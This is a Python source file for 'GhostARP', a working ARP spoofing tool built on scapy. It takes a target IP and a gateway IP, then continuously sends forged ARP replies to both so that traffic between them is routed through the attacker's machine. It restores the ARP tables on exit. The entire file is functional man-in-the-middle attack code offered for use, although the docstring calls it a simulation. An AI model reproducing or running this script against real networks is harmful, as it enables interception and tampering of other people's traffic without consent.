#!/usr/bin/env python3

"""
GhostARP Tool v1.0

Author: Devansh Solanki

Features:
- ARP Spoofing Simulation (Target ↔ Gateway)
- Continuous Packet Transmission Loop
- ARP Cache Restoration on Exit (Ctrl+C)
- Target MAC Resolution via ARP Requests
- Clean Terminal Status Acknowledgements (Professional Output)

"""

import scapy.all as scapy
import time
import logging
import termios
import sys

# Disable ^C echo
fd = sys.stdin.fileno()
old_settings = termios.tcgetattr(fd)
new_settings = termios.tcgetattr(fd)
new_settings[3] &= ~termios.ECHOCTL
termios.tcsetattr(fd, termios.TCSANOW, new_settings)

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    answered_list = scapy.srp(
        arp_request_broadcast,
        timeout=1,
        verbose=False
    )[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(
        op=2,
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac
    )
    scapy.send(packet, count=4, verbose=False)


try:
    target_ip = input("[+] Enter your target IP: ").strip()
    gateway_ip = input("[+] Enter the gateway IP (your router's IP): ").strip()
except KeyboardInterrupt:
    print("\n[-] Detected ctrl+c... Exiting without changes...")
    sys.exit(0)


time.sleep(2)
print("\n[+] Spoofing your target " + target_ip + "....")
time.sleep(2)
print("[+] Sending packets.....")
time.sleep(2)
print("\n")

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)

except KeyboardInterrupt:
    print("\n\n[-] Detected ctrl+c...")
    time.sleep(2)
    print("[-] Resetting ARP Tables.....")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    time.sleep(2)
    print("[+] Original ARP Tables are set....")
    time.sleep(2)
    print("[+] Spoofing completed successfully...")
    sys.exit(0)

finally:
    termios.tcsetattr(fd, termios.TCSANOW, old_settings)
